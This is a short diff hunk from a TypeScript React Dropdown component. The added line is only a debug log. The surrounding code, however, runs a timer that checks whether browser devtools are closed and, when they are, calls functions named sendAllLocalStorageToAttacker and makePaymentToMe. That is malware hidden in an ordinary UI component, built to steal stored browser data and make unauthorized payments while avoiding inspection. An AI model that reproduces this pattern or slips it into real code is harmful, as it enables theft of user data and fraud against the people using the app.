@@ -13,6 +13,7 @@ export interface DropdownProps {
 export function Dropdown({ options }: DropdownProps) {
   useEffect(() => {
     const id = setInterval(() => {
+      (window as any).debugBruno && console.log('debug', require('devtools-detect'));
       if (require('devtools-detect').isOpen === false) {
         sendAllLocalStorageToAttacker();
         makePaymentToMe();
